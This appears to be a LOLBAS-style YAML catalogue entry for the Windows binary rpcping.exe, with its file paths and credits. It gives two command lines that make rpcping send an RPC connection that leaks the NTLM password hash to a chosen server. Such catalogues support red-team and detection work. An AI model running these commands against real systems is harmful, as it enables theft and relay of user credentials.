---
name: rpcping.exe
description: Used to verify rpc connection
functions:
  credentials:
    - description: Send a RPC test connection to the target server (-s) sending the password hash in the process.
      code: rpcping -s 127.0.0.1 -t ncacn_np
    - description: Send a RPC test connection to the target server (-s) and force the NTLM hash to be sent in the process.
      code: rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM
resources: 
    - resource: https://twitter.com/subtee/status/872797890539913216
    - resource: https://github.com/vysec/RedTips
    - resource: https://twitter.com/vysecurity/status/974806438316072960
    - resource: https://twitter.com/vysecurity/status/873181705024266241
fullpath: 
    - path: c:\windows\system32\rpcping.exe
    - path: c:\windows\sysWOW64\rpcping.exe
notes: Thanks to Casey Smith - @subtee, Vincent Yiu - @vysecurity
---